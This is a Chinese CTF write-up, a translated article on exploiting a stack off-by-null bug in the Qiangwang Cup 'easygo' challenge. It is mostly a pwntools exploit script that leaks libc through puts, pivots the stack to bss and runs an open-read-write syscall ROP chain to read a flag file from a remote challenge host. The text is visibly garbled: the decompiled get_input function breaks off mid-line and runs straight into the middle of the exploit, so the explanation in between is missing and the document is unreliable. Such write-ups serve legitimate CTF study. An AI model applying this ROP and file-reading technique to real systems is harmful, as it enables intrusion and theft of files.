# 从强网杯线下easygo看栈中off-by-null的利用
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
之前我们一直都是将off-by-null设置到堆中，但是在今年强网杯线下的几道题目中都涉及到了栈中off-by-null的利用。
## 分析
程序的主逻辑非常的简单
    __int64 main()
    {
      __int64 result; // rax
      do
      {
        result = (unsigned int)get_input() ^ 1;
        if ( (_BYTE)result )
          break;
        printf("continue?(0:no, 1:yes): ");
        result = readint();
      }
      while ( (_DWORD)result );
      return result;
    }
    __int64 get_input()
    {
      char s1[16]; // [rsp+0h] [rbp-10h] BYREF
      printf("client send >> ");
      readstr((__int64)s1, 0x10);
      if ( !strcmp(s1, "exit") )
        return 0LL;
      printf("server back > ", "a\n")
            p.sendafter("1:yes): ", (b"\x00" + str(0x100).encode()).ljust(8, b"\x00") + p64(0x4015AB))
            payload = p32(0xdeadbeef) + p32(0x4) + p64(0xdeadbeef) + p64(p_rdi_r) + p64(elf.got['puts']) + p64(elf.plt['puts'])
            payload += p64(p_rdi_r) + p64(bss) + p64(p_rsi_r15_r) + p64(0x300) + p64(0) + p64(read)
            payload += p64(p_rsp_r) + p64(bss)
            p.sendline(payload)
            libc.address = u64(p.recvline(timeout=1).strip().ljust(8, b"\x00")) - libc.sym['puts']
            log.success("libc address is {}".format(hex(libc.address)))
            break
        except KeyboardInterrupt:
            exit(0)
        except:
            p.close()
            if debug:
                p = process([file_path])
            else:
                p = remote('172.20.5.31', 22423)
    p_rdi_r = 0x0000000000026b72 + libc.address
    p_rsi_r = 0x0000000000027529 + libc.address
    p_rdx_r12_r = 0x000000000011c371 + libc.address
    p_rax_r = 0x000000000004a550 + libc.address
    syscall = 0x0000000000066229 + libc.address
    ret_addr = 0x0000000000025679 + libc.address
    flag_str_address = bss + 0x250
    orw = flat([
        p_rax_r, 2,
        p_rdi_r, flag_str_address,
        p_rsi_r, 0,
        syscall,
        p_rax_r, 0,
        p_rdi_r, 3,
        p_rsi_r, flag_str_address,
        p_rdx_r12_r, 0x40, 0,
        syscall,
        p_rax_r, 1,
        p_rdi_r, 1,
        p_rsi_r, flag_str_address,
        p_rdx_r12_r, 0x40, 0,
        syscall
    ])
    payload = p64(ret)*4 + orw.ljust(0x250, b"\x00") + b"flag\n"
    p.send(payload)
    p.interactive()